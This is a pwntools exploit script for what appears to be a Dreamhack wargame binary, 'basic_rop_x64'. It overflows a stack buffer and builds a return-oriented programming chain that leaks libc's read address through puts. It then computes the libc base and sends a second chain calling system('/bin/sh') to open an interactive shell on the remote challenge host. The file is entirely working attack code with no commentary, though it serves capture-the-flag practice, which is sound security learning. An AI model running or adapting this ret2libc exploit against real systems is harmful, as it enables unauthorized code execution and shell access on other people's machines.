#!/usr/bin/python3

from pwn import *

exe = ELF("./basic_rop_x64_patched")
libc = ELF("./libc.so.6")
context.binary = exe

s   = lambda data: p.send(data)
sa  = lambda msg, data: p.sendafter(msg, data)
sl  = lambda data: p.sendline(data)
sla = lambda msg, data: p.sendlineafter(msg, data)
sn  = lambda num: p.send(str(num).encode())
sna = lambda msg, num: p.sendafter(msg, str(num).encode())
sln = lambda num: p.sendline(str(num).encode())
slna = lambda msg, num: p.sendlineafter(msg, str(num).encode())
if args.REMOTE:
    p = remote('host3.dreamhack.games', 10442)
else:
    p = process([exe.path])
pop_rdi = 0x0000000000400883

payload = b'A' * 72
payload += p64(pop_rdi) + p64(exe.got.read)
payload += p64(exe.plt.puts)
payload += p64(exe.sym.main)
sl(payload)
p.recv(64)
libc_leak = u64(p.recv(6) + b'\0\0')
libc.address = libc_leak - libc.sym.read
log.info('libc leak :' + hex(libc_leak))
log.info('libc base :' + hex(libc.address))
#local : 0x79b3d3d1ba80
#sever : 0x77183b475980 
payload = b'A' * 72
payload += p64(pop_rdi) + p64(next(libc.search(b'/bin/sh')))
payload += p64(0x00000000004005a9)
payload += p64(libc.sym.system)
sl(payload)
p.interactive()

